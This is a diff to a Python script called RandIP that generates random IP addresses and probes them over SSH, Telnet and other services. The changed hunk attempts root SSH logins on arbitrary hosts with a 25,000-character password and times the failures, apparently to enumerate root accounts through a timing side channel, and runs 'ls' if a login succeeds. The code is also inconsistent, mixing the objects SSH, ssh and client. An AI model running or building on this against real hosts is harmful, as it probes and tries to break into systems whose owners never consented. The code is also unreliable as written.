@@ -1,4 +1,4 @@
-#RandIP 0.9 beta#
+#RandIP 0.9.2 beta#
 #Random IP Generator with Tor, Socket, SSH, Telnet, and HTML Screenshot support.#
 #Report bugs including uncontained exceptions to blmvxer@gmail.com#
 import socket, os, time, telnetlib, paramiko, requests, zipfile, stem.process, subprocess, sys
@@ -222,13 +222,21 @@ for address in randip():
 			try:
 				print('Starting SSH Attempt on %s' % address)
 				SSH = paramiko.SSHClient()
-				p = 'A'*25000#Enumerate root user#
-				SSH.connect(address, username='root', password=p)
-				stdin, stdout, stderr = client.exec_command('ls')
-				for line in stdout:
-					print '... ' + line.strip('\n')
-				client.close()
-				f.append(address)
+				p = 'A'*25000
+				starttime=time.clock()
+				ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+				try:
+					SSH.connect(address, username='root', password=p)
+					stdin, stdout, stderr = client.exec_command('ls')
+					for line in stdout:
+						print '... ' + line.strip('\n')
+					client.close()
+					f.append(address)
+				except:
+					endtime=time.clock()
+					f.append(address)
+					total=endtime-starttime
+					print(total)
 			except socket.timeout:
 				print(socket.timeout, '%s timeout SSH or SSH not accessible' % address)
 				g.append(address)
